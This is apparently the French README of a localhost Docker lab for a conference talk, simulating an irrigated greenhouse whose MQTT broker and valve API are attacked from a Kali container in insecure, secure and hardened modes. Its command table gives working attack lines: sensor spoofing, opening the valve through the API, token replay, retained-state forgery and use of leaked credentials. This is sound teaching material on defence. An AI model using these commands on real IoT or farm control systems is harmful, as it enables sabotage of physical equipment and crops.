# Lab — Serre sous attaque (100 % Docker)

Ferme simulée pour le talk GDG Lomé 2026. Aucun capteur réel, aucun signal radio,
aucune cible externe. Le lab reste sur `127.0.0.1` par défaut.

## Architecture

```
  simulator ──capteurs──▶ mosquitto ──▶ dashboard (Flask, modèle, impact FCFA)
  (humidité, température,     ▲                │ POST /api/valve/{open,close}
   débit, vanne)              │                ▼
       ▲                      └──── commande MQTT (token ou HMAC) ────┘
       └───────────────── attacker — Kali (profil « attack »)
```

| Service | Rôle | Port hôte |
|---|---|---|
| `mosquitto` | Broker MQTT (config selon le mode) | `1883` (clair), `8883` (TLS) |
| `simulator` | Capteurs + contrôleur de vanne | — |
| `dashboard` | Tableau de bord, modèle de rendement, journal, impact | `8080` |
| `attacker` | **Kali Linux** : `nmap`, `mosquitto_pub/sub`, `curl`, `python3` (`profiles: [attack]`) | — |

Noms Docker : `<STACK_NAME>-<service>` (par défaut `gdg-farm-dev-dashboard`, etc.).

## Les trois modes

| Mode | Broker | API vanne | Commande MQTT | Détection |
|---|---|---|---|---|
| `insecure` | anonyme, 1883 | ouverte | aucune vérification | aucune |
| `secure` (défense naïve) | anonyme, 1883 | Bearer token | token statique, **rejouable** | plage `[20, 100]` |
| `hardened` | TLS 8883, comptes, ACL | Bearer token | HMAC-SHA256 + nonce + horodatage 10 s | plage, saut vs médiane, cohérence vanne/débit |

## Installation (une fois, avec Internet)

```bash
cd gdg_lome/2026/demos
docker pull eclipse-mosquitto:2 kalilinux/kali-rolling
bash scripts/setup.sh        # .env, secrets, CA + certificat, comptes MQTT, images
bash scripts/mode.sh insecure
```

`setup.sh` est idempotent ; `--force` régénère la PKI et les secrets.
Les fichiers générés (`mosquitto/tls/`, `mosquitto/secrets/`, `.env`) sont ignorés par git.

Page de la serre : <http://127.0.0.1:8080>

## Changer de mode

```bash
bash scripts/mode.sh insecure|secure|hardened
```

Toujours passer par ce script : il écrit `FARM_MODE` dans `.env`, recrée **uniquement**
les services de la ferme (`mosquitto simulator dashboard` — ce qui vide aussi les faux
états retenus) et affiche le mode réellement actif. Le conteneur attaquant persistant
n'est **pas** touché : son shell survit à la bascule de mode.
Ne pas préfixer une seule commande (`FARM_MODE=secure docker compose ...`).

## L'attaquant Kali (lancé une fois)

L'attaquant est un conteneur **Kali Linux persistant** : on le démarre **une fois** et on
garde son shell ouvert tout le talk. `nmap`, `mosquitto_pub/sub`, `curl`, `python3` y sont
déjà installés.

```bash
docker compose --profile attack up -d attacker    # démarre Kali (persistant)
docker compose exec attacker bash                  # ouvre un shell dedans
# raccourci équivalent :
bash scripts/attack.sh
```

L'attaquant reste vivant quand on change de mode. Les identifiants « fuités » du mode
hardened sont dans son environnement : `$LEAK_VIEWER_PASS`, `$LEAK_MAINTENANCE_PASS`,
`$LEAK_SENSOR02_PASS`.

## Commandes d'attaque (brutes, ligne par ligne)

La démo n'utilise **aucun script** : chaque attaque est une commande explicite, tapée dans
le shell Kali. Le détail slide par slide est dans [`../docs/demo_commandes.md`](../docs/demo_commandes.md).

| Attaque | Commande brute (depuis le shell attaquant) |
|---|---|
| Recon ports/versions | `nmap -sT -sV -p 1883,8883,8080 mosquitto dashboard` |
| Écoute du bus | `mosquitto_sub -h mosquitto -t '#' -v -W 6` |
| Fausse humidité | `for i in $(seq 1 15); do mosquitto_pub -h mosquitto -t farm/sensor/humidity -m 0; done` |
| Ouvrir la vanne (insecure) | `curl -i -X POST http://dashboard:8080/api/valve/open` |
| État / impact | `curl -s http://dashboard:8080/api/state` |
| Capturer une commande | `mosquitto_sub -h mosquitto -t farm/actuator/valve -C 1` |
| Rejouer (secure) | `mosquitto_pub -h mosquitto -t farm/actuator/valve -m '{"command":"OPEN","token":"gdg-demo-token"}'` |
| Faux état retenu | `mosquitto_pub -h mosquitto -t farm/actuator/valve/state -r -m CLOSED` |
| Anonyme refusé (hardened) | `mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt -t '#' -C 1` |
| Sniff « viewer » (hardened) | `mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt -u viewer -P "$LEAK_VIEWER_PASS" -t 'farm/#' -v -W 4` |
| Forger sans HMAC (hardened) | `mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt -u maintenance -P "$LEAK_MAINTENANCE_PASS" -t farm/actuator/valve -m '{"command":"OPEN"}'` |

> En mode hardened, un `mosquitto_pub` refusé par l'ACL ou par la signature n'affiche pas
> d'erreur côté client : le rejet se lit dans le **journal du dashboard** (`docker compose
> logs -f simulator dashboard`) et sur l'état de la vanne (reste CLOSED).

> Héritage : `attack.py` (wrapper Python) et `scripts/demo.sh` (déroulé automatique) restent
> dans le dépôt pour référence, mais la démo officielle se fait en commandes brutes.

## Hypothèses d'impact

Serre de tomates de 500 m² (maraîchage péri-urbain), 4 000 kg par cycle à 500 FCFA/kg
(2 000 000 FCFA), goutte-à-goutte 33 L/min, eau et pompage 600 FCFA/m³, temps accéléré
×60. Ce sont des ordres de grandeur pour la démo, pas des statistiques officielles.
À modifier dans `HYPOTHESES` de `dashboard/app.py`.

## Arrêt et nettoyage

```bash
docker compose stop              # garde les conteneurs
docker compose down              # supprime conteneurs et réseau (garde images + secrets)
bash scripts/teardown.sh         # supprime TOUT : conteneurs, réseau, images, secrets locaux
bash scripts/teardown.sh --purge # idem + images de base (mosquitto, kali)
```

`teardown.sh` efface par défaut la PKI, les mots de passe et le `.env` générés :
à lancer après une démo sur une machine prêtée ou partagée. `--keep-secrets` les garde.

## Dépannage

| Symptôme | Correction |
|---|---|
| Mode inattendu sur la page | `bash scripts/mode.sh <mode>` |
| `CA absente` ou `REFUSÉ` partout en hardened | `bash scripts/setup.sh --force` puis `mode.sh hardened` |
| Score bas dès le départ | `python attack.py reset`, attendre 10 s |
| Vrai capteur rejeté (« saut anormal ») après `drift` | normal : `bash scripts/mode.sh hardened` pour repartir |
| Port déjà utilisé | changer `LAB_BIND` ou les ports dans `compose.yaml` |
| Logs | `docker compose logs -f simulator dashboard mosquitto` |

## Sécurité du lab

- Ne jamais exposer ce lab sur Internet ; `LAB_BIND=127.0.0.1` par défaut.
- Pour un atelier en salle : `LAB_BIND=<IP_LAN>` sur un réseau isolé.
- Les identifiants `LEAK_*` et `DEMO_TOKEN` sont des valeurs de démo publiques.
